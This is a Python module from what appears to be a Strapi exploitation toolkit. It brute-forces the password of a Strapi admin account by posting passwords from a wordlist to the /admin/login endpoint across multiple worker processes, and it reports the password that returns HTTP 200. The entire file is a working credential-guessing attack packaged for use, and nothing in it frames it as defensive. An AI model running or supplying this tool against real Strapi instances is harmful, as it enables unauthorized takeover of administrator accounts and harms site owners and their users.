'''Strapi Admin Panel Bruteforce'''
import requests
from strapi_exploit import StrapiExploitInterface
from os.path import exists
from multiprocessing import Pool
from logger import logger

class AdminBruteforce(StrapiExploitInterface):
    '''Strapi Admin Panel Brueforce'''
    def __init__(self):
        super().__init__("Admin panel bruteforce", "Try to gain access to the admin panel by bruteforcing the password")
    def run(self) -> bool:
        url = self.input("URL of the Strapi instance")
        if url[-1] == "/":
            url = url[:-1]
        if url.endswith("/admin/login"):
            url = url[:-12]
        self.info(url)
        email = self.input("Email of the admin")
        thread = self.input("Number of threads")
        filename = self.input("Wordlist file")
        if exists(filename) is False:
            self.error("Wordlist file does not exist")
            return False
        try:
            thread = int(thread)
        except ValueError:
            self.error("Invalid thread number")
            return False
        wordlist = [i.strip() for i in open(filename, "r", encoding="latin-1").readlines()]
        self.info(f"Loaded {len(wordlist)} passwords - {thread} threads")
        run(email, wordlist, url, thread)
        return True

def check(email: str, password: str, url: str) -> bool:
    '''Check if the password is correct'''
    r = requests.post(f"{url}/admin/login",
        data={"email": email, "password": password},
        timeout=10
    )

    if r.status_code == 200:
        logger.success(f"Found password: {password}")
        return True
    return False

def callback(result: bool, pool: Pool):
    '''Callback function'''
    if result is True:
        pool.terminate()

def run(email: str, password_list: list, url: str, thread: int):
    '''Run the bruteforce'''
    pool = Pool(thread)
    for password in password_list:
        pool.apply_async(check, args=(email, password, url), callback=lambda x: callback(x, pool))
    pool.close()
    pool.join()
    logger.info("Done !")

def init():
    return AdminBruteforce()